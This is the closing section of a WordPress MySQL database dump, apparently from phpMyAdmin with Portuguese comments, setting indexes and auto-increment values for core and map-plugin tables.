-- Índices de tabela `wp_term_taxonomy`
--
ALTER TABLE `wp_term_taxonomy`
  ADD PRIMARY KEY (`term_taxonomy_id`),
  ADD UNIQUE KEY `term_id_taxonomy` (`term_id`,`taxonomy`),
  ADD KEY `taxonomy` (`taxonomy`);

--
-- Índices de tabela `wp_usermeta`
--
ALTER TABLE `wp_usermeta`
  ADD PRIMARY KEY (`umeta_id`),
  ADD KEY `user_id` (`user_id`),
  ADD KEY `meta_key` (`meta_key`(191));

--
-- Índices de tabela `wp_users`
--
ALTER TABLE `wp_users`
  ADD PRIMARY KEY (`ID`),
  ADD KEY `user_login_key` (`user_login`),
  ADD KEY `user_nicename` (`user_nicename`),
  ADD KEY `user_email` (`user_email`);

--
-- AUTO_INCREMENT de tabelas apagadas
--

--
-- AUTO_INCREMENT de tabela `wp_commentmeta`
--
ALTER TABLE `wp_commentmeta`
  MODIFY `meta_id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT de tabela `wp_comments`
--
ALTER TABLE `wp_comments`
  MODIFY `comment_ID` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT de tabela `wp_create_map`
--
ALTER TABLE `wp_create_map`
  MODIFY `map_id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT de tabela `wp_group_map`
--
ALTER TABLE `wp_group_map`
  MODIFY `group_map_id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT de tabela `wp_g_circles`
--
ALTER TABLE `wp_g_circles`
  MODIFY `id` int(11) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT de tabela `wp_g_maps`
--
ALTER TABLE `wp_g_maps`
  MODIFY `id` int(11) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT de tabela `wp_g_markers`
--
ALTER TABLE `wp_g_markers`
  MODIFY `id` int(11) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=4;

--
-- AUTO_INCREMENT de tabela `wp_g_polygones`
--
ALTER TABLE `wp_g_polygones`
  MODIFY `id` int(11) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT de tabela `wp_g_polylines`
--
ALTER TABLE `wp_g_polylines`
  MODIFY `id` int(11) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT de tabela `wp_links`
--
ALTER TABLE `wp_links`
  MODIFY `link_id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT de tabela `wp_map_locations`
--
ALTER TABLE `wp_map_locations`
  MODIFY `location_id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT de tabela `wp_options`
--
ALTER TABLE `wp_options`
  MODIFY `option_id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=33287;

--
-- AUTO_INCREMENT de tabela `wp_postmeta`
--
ALTER TABLE `wp_postmeta`
  MODIFY `meta_id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=306;

--
-- AUTO_INCREMENT de tabela `wp_posts`
--
ALTER TABLE `wp_posts`
  MODIFY `ID` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=190;

--
-- AUTO_INCREMENT de tabela `wp_termmeta`
--
ALTER TABLE `wp_termmeta`
  MODIFY `meta_id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT de tabela `wp_terms`
--
ALTER TABLE `wp_terms`
  MODIFY `term_id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=4;

--
-- AUTO_INCREMENT de tabela `wp_term_taxonomy`
--
ALTER TABLE `wp_term_taxonomy`
  MODIFY `term_taxonomy_id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=4;

--
-- AUTO_INCREMENT de tabela `wp_usermeta`
--
ALTER TABLE `wp_usermeta`
  MODIFY `umeta_id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=51;

--
-- AUTO_INCREMENT de tabela `wp_users`
--
ALTER TABLE `wp_users`
  MODIFY `ID` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
